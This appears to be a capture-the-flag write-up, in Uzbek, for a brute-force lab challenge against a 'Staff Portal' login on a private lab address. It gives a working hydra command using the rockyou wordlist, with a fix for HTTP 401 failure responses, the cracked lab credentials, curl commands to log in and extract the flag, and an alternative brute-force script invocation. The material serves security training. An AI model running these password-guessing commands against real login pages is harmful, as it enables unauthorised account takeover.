# ✅ YECHIM — 04 · Brute Force: Staff Portal

**Status:** HAL QILINDI (parol topildi)
**Target:** `http://10.15.1.54:9004/`
**Credentials:** `admin` : `jordan23`

---

## Recon natijasi
| Nima | Qiymat |
|------|--------|
| Login endpoint (POST) | `/login` |
| Maydonlar | `username`, `password` |
| **Xato javob** | **HTTP 401** + `Invalid username or password.` |

## Kalit nuqta — HTTP 401
Portal **noto'g'ri parolda `401`** qaytaradi. Hydra `4xx` ni "xato" deb hisoblab
`received HTTP error code 401 ... set "1="` deb qichqiradi va ishlamaydi.
Yechim: `http-post-form` shartiga **`1=`** (bo'sh) qo'shish — `F=` dan oldin.

## Ishlagan buyruq
```bash
hydra -I -l admin -P /usr/share/wordlists/rockyou.txt -s 9004 -t 16 -f \
      10.15.1.54 \
      http-post-form "/login:username=^USER^&password=^PASS^:1=:F=Invalid"
```
Natija:
```
[9004][http-post-form] host: 10.15.1.54   login: admin   password: jordan23
1 of 1 target successfully completed, 1 valid password found
```

## Flagni olish
```bash
curl -s -L -c /tmp/cj -b /tmp/cj \
     -d "username=admin&password=jordan23" \
     http://10.15.1.54:9004/login -o /tmp/out.html \
     -w 'http=%{http_code} url=%{url_effective}\n'
grep -o 'HTB{[^}]*}' /tmp/out.html
```
Agar flag bosh sahifada bo'lmasa, boshqa sahifalarni ham ko'ring:
```bash
for p in / /dashboard /home /admin /panel /flag; do
  echo "== $p =="
  curl -s -L -c /tmp/cj -b /tmp/cj "http://10.15.1.54:9004$p" | grep -o 'HTB{[^}]*}'
done
```

## Muqobil (hydra `1=` ishlamasa)
```bash
python3 brute.py --url http://10.15.1.54:9004/login \
                 --login-page http://10.15.1.54:9004/ \
                 --username admin --wordlist /usr/share/wordlists/rockyou.txt \
                 --fail "Invalid username or password" --threads 32
```

## Saboq
- Noto'g'ri login uchun **401** qaytaruvchi formalar hydra'da `1=` talab qiladi.
- `-V` ni ishlatmang (juda sekinlashtiradi).
- `rockyou.txt` mashhurlik bo'yicha tartiblangan — `jordan23` TOP ~200 ichida,
  shuning uchun 15 sekundda topildi.
